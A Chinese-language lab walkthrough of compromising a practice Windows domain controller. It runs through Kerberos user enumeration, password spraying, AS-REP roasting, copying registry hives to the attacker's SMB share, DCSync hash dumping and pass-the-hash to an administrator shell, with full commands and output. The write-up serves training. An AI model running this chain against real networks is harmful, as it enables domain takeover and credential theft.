# 一、信息收集

## 主机发现

使用arp-scan扫描本地网段，发现目标主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.146 08:00:27:ae:b5:53       PCS Systemtechnik GmbH
...
```

确定目标IP：`192.168.205.146`

## 端口扫描

使用rustscan对目标进行全端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ rustscan -a 192.168.205.146
...
Open 192.168.205.146:53
Open 192.168.205.146:88
Open 192.168.205.146:135
Open 192.168.205.146:139
Open 192.168.205.146:389
Open 192.168.205.146:445
Open 192.168.205.146:464
Open 192.168.205.146:593
Open 192.168.205.146:636
Open 192.168.205.146:3268
Open 192.168.205.146:3269
Open 192.168.205.146:5985
Open 192.168.205.146:9389
```

从开放端口可以判断这是一台Windows域控制器，关键服务包括：

- 53: DNS服务
- 88: Kerberos认证服务
- 389/636: LDAP/LDAPS
- 445: SMB服务
- 5985: WinRM服务

## SMB信息收集

使用enum4linux-ng进行SMB枚举：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ enum4linux-ng -A 192.168.205.146
...
[+] Long domain name is: SOUPEDECODE.LOCAL
[+] Got domain/workgroup name: SOUPEDECODE
[+] Full NetBIOS names information:
- DC01            <00> -         M <ACTIVE>  Workstation Service
- SOUPEDECODE     <1c> - <GROUP> M <ACTIVE>  Domain Controllers
...
```

获取重要信息：

- 域名：`SOUPEDECODE.LOCAL`
- 域控制器主机名：`DC01`
- FQDN：`DC01.SOUPEDECODE.LOCAL`
- 无匿名登录

将域名添加到hosts文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo "192.168.205.146 SOUPEDECODE.LOCAL" >> /etc/hosts
```

## 漏洞扫描

使用nmap漏洞扫描脚本检测SMB相关漏洞：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap --script=vuln -p445,139 192.168.205.146 
...
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
...
```

未发现可利用的SMB漏洞。

## LDAP信息收集

尝试匿名绑定LDAP服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ldapsearch -H ldap://192.168.205.146 -x -b "dc=soupedecode,dc=local"
...
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection.
...
```

LDAP服务拒绝匿名查询，需要有效凭据。

# 二、用户枚举

使用kerbrute工具枚举域用户：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ kerbrute userenum --dc 192.168.205.146 -d soupedecode.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 64
...
2025/09/03 13:39:39 >  [+] VALID USERNAME:       admin@soupedecode.local
2025/09/03 13:39:39 >  [+] VALID USERNAME:       charlie@soupedecode.local
2025/09/03 13:39:39 >  [+] VALID USERNAME:       administrator@soupedecode.local
...
```

发现有效用户名：

- admin
- charlie
- administrator

# 三、密码爆破

## SMB密码爆破

使用crackmapexec对发现的用户进行密码喷洒攻击：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ crackmapexec smb 192.168.205.146 -u user -p user --continue-on-success| grep '+'
SMB                      192.168.205.146 445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
```

成功获得一组有效凭据：`charlie:charlie`

## 验证权限

使用获得的凭据查看SMB共享权限：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nxc smb 192.168.205.146 -u charlie -p charlie --shares
...
SMB         192.168.205.146 445    DC01             Share           Permissions     Remark
SMB         192.168.205.146 445    DC01             -----           -----------     ------
SMB         192.168.205.146 445    DC01             ADMIN$                          Remote Admin
SMB         192.168.205.146 445    DC01             C$                              Default share
SMB         192.168.205.146 445    DC01             IPC$            READ            Remote IPC
SMB         192.168.205.146 445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.205.146 445    DC01             SYSVOL          READ            Logon server share
```

charlie用户只有标准的域用户权限，无法访问敏感共享。

# 四、域用户进一步枚举

## RID爆破

使用charlie用户的凭据进行RID爆破，获取更多用户信息：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nxc smb 192.168.205.146 -u charlie -p charlie --rid-brute|awk -F '\' '{print $2}'|awk '{print $1}' > user
```

## Kerberoasting攻击

使用GetNPUsers工具检查是否有用户设置了"不要求Kerberos预认证"属性：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ impacket-GetNPUsers -usersfile user -dc-ip 192.168.205.146 'SOUPEDECODE.LOCAL/charlie:charlie' |grep -v "-"

$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:658c87a58d98ac6611635ed17f2dde44$dca073223197802e16eda82933c8edf55b906146cf6eb9ba9e5ff4c3dff4a74d70a91b8787a8a12dd5a85196534f86252203f806f02793903578d5d42c2f4df593c749f6a47f81011356b05caee386f1610848d1a1e92fa79504b988bed455e8e973f720203ac48e13398cd103a0e719bacf3e880591e0aab24a4f191832bb948fe7f5fcd3b17e16302998e592387ae5a25c6c8b8a5566f2b2aa7cd6e26e392c06e7877069df8736662a357aba9edf69cc5b294af97a3af3df6350db9ba829a98ef293de9f10242642e8dab8c55e8024d26c98b7ae9c12a9ff9a0c4afc52f97e765569d0ab540c80505536cade0fce31973c6854507d
```

发现用户`zximena448`存在AS-REP Roasting漏洞，获得Kerberos票据哈希。

## 哈希破解

使用john工具破解AS-REP哈希：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
...
internet         ($krb5asrep$23$zximena448@SOUPEDECODE.LOCAL)   
...
```

成功破解密码：`zximena448:internet`

# 五、权限提升

## 验证新凭据

使用新获得的凭据测试权限：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nxc smb 192.168.205.146 -u zximena448 -p internet --shares   
...
SMB         192.168.205.146 445    DC01             Share           Permissions     Remark
SMB         192.168.205.146 445    DC01             -----           -----------     ------
SMB         192.168.205.146 445    DC01             ADMIN$          READ            Remote Admin
SMB         192.168.205.146 445    DC01             C$              READ,WRITE      Default share
...
```

zximena448用户具有更高权限，可以访问ADMIN$和C$共享。

## LDAP详细枚举

使用ldapdomaindump工具进行详细的LDAP信息收集：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 /usr/lib/python3/dist-packages/ldapdomaindump -u 'SOUPEDECODE.LOCAL\zximena448' -p 'internet' 192.168.205.146
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

通过查看生成的HTML报告，发现zximena448用户是**Backup Operators**组的成员。

## Backup Operators权限利用

Backup Operators是Windows的内置组，该组成员具有SeBackupPrivilege特权，可以读取域控制器上的敏感文件，包括SAM数据库。

### 设置SMB服务器

在攻击机上启动SMB服务器接收备份文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ impacket-smbserver share . -smb2support
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
...
```

### 备份注册表

利用SeBackupPrivilege特权备份SAM、SYSTEM和SECURITY注册表：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ impacket-reg 'zximena448:internet@192.168.205.146' backup -o '\\192.168.205.128\share'
[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\192.168.205.128\share\SAM.save
[*] Saved HKLM\SYSTEM to \\192.168.205.128\share\SYSTEM.save
[*] Saved HKLM\SECURITY to \\192.168.205.128\share\SECURITY.save
```

### 提取本地哈希

使用secretsdump工具从备份的注册表文件中提取密码哈希：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
...
[*] $MACHINE.ACC 
...
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:aa905227fd1b4142a01a09912606af5c
...
```

获得机器账户`DC01$`的NTLM哈希：`aa905227fd1b4142a01a09912606af5c`

## DCSync攻击

### 验证机器账户权限

使用机器账户哈希验证权限：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nxc smb 192.168.205.146 -u 'DC01$' -H 'aa905227fd1b4142a01a09912606af5c' --ntds
[+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.205.146 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
SMB         192.168.205.146 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.205.146 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
SMB         192.168.205.146 445    DC01             soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
```

成功执行DCSync攻击，获得域内所有用户的密码哈希，包括域管理员Administrator的NTLM哈希：`8982babd4da89d33210779a6c5b078bd`

# 六、获取域管权限

使用域管理员的NTLM哈希进行Pass-the-Hash攻击：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ evil-winrm -i 192.168.205.146 -u Administrator -H '8982babd4da89d33210779a6c5b078bd'       
                                      
Evil-WinRM shell v3.7
...
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
soupedecode\administrator
```

成功获得域管理员权限。

## 获取flag

```bash
*Evil-WinRM* PS C:\Users> type C:\Users\Administrator\Desktop\root.txt
d41d8cd98f00b204e9800998ecf8427e

*Evil-WinRM* PS C:\Users> type C:\Users\zximena448\Desktop\user.txt
2fe79eb0e02ecd4dd2833cfcbbdb504c
```

# 七、攻击总结

本次渗透测试的攻击路径如下：

1. **信息收集**：通过端口扫描和服务枚举，识别目标为Windows域控制器
2. **用户枚举**：使用kerbrute工具枚举有效域用户
3. **凭据获取**：通过密码喷洒攻击获得charlie用户凭据
4. **AS-REP Roasting**：发现zximena448用户存在Kerberos预认证漏洞，破解获得密码
5. **权限提升**：利用zximena448用户的Backup Operators权限备份注册表
6. **横向移动**：提取机器账户哈希，执行DCSync攻击
7. **域管接管**：使用域管理员哈希获得完全控制权限

**关键知识点**：

- **Backup Operators组**：该组成员具有SeBackupPrivilege特权，可以备份和还原文件，包括敏感的系统文件
- **AS-REP Roasting**：针对设置了"不要求Kerberos预认证"属性的用户账户的攻击技术
- **DCSync攻击**：利用域控制器权限同步整个域数据库的高级攻击技术
- **Pass-the-Hash**：无需明文密码，直接使用NTLM哈希进行身份验证的技术